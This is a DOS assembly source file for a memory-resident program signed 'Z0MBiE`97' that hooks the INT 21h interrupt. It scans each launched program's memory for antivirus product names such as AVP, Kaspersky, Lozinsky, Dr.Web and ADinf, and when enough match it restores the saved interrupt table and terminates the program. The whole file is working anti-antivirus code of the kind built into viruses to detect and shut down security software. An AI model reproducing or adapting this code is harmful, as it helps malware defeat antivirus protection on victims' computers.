
include         rulez.inc

                org     100h
start:
                jmp     init

flags           dw      ?
count           dw      ?

inttable        db      1024 dup (?)

int21:          cmp     ah, 4bh
                jne     @@1
                call    saveinttable
@@1:
                cmp     ah, 4ah
                jne     @@2
                call    analize
@@2:

                db      0eah
old21           dd      ?

saveinttable:   pushf
                pusha
                push    ds es
                xor     si, si
                mov     ds, si
                mve     es, cs
                lea     di, inttable
                mov     cx, 1024
                cld
                cli
                rep     movsb
                pop     es ds
                popa
                popf
                ret

restinttable:   pushf
                pusha
                push    ds es
                mve     ds, cs
                lea     si, inttable
                xor     di, di
                mov     es, di
                mov     cx, 1024
                cld
                cli
                rep     movsb
                pop     es ds
                popa
                popf
                ret

analize:        pusha
                push    ds es

                mve     ds, cs

                xor     ax, ax
                mov     flags, ax
                mov     count, ax

                mov     ah, 62h
                int     21h

                dec     bx
                mov     es, bx

                mov     ax, es:[0003h]

                cmp     ax, minprgsize shr 4
                jb      @@exit

                inc     bx
@@1:            mov     es, bx

                push    ax bx
                call    search
                pop     bx ax

                add     bx, 65536 shr 4

                sub     ax, 65536 shr 4
                jns     @@1

@@exit:         pop     es ds
                popa
                ret

search:         lea     bp, badptr
                xor     dx, dx

@@1:            mov     si, cs:[bp]

                inc     si
                jz      @@exit
                dec     si

                push    dx

                call    searchword

                pop     dx
                inc     dx

                inc     bp
                inc     bp

                jmp     @@1

@@exit:         ret

searchword:     cld

                lodsb
                cbw
                xchg    cx, ax

                jcxz    @@exit

                xor     di, di
                mov     al, [si]

@@1:            cmp     di, 0fff0h - 64
                jae     @@exit

                push    cx
                mov     cx, 0fff0h
                sub     cx, di
                repne   scasb
                dec     di
                pop     cx

                push    cx si
                rep     cmpsb
                pop     si cx

                jne     @@1

                bts     flags, dx
                jc      @@exit

                inc     count
                cmp     count, find_num
                jb      @@exit

                call    restinttable

                mov     ax, 3
                int     10h

                mov     ah, 9
                lea     dx, errormsg
                int     21h

                lea     bx, badptr

@@4:            shr     flags, 1
                jnc     @@3

                mov     dx, [bx]
                inc     dx
                mov     ah, 9
                int     21h

@@3:            inc     bx
                inc     bx

                cmp     word ptr [bx], 0ffffh
                jne     @@4

                mov     ah, 9
                lea     dx, endmsg
                int     21h

                mov     ax, 4c00h
                int     21h

@@exit:         ret

errormsg        db      '(* Heuristic Analyzer 1.00',13,10
                db      '   (c) Z0MBiE`97',13,10
                db      '   antivirus detected',13,10
                db      '   flags: $'
endmsg          db      13,10
                db      '   *)',13,10,'$'

badptr          dw      bad00,bad01,bad02,bad03,bad04,bad05,bad06,bad07
                dw      bad08,bad09,bad10,bad11,bad12,bad13,bad14,bad15
                dw      -1

minprgsize      equ     50000
find_num        equ     4

bad00           db      5,'анило $'
bad01           db      6,'озинск $'
bad02           db      6,'асперс $'
bad03           db      3,'loz $'
bad04           db      6,'aspers $'
bad05           db      3,'AVP $'
bad06           db      3,'Web $'
bad07           db      5,'ADinf $'
bad08           db      4,'irus $'
bad09           db      5,'-2856 $'
bad10           db      6,'fected $'
bad11           db      5,'eriff $'
bad12           db      5,'вирус $'
bad13           db      7,'antivir $'
bad14           db      4,'KAMI $'
bad15           db      5,'dials $'

init:           replaceint 21
                tsr     init

                end     start
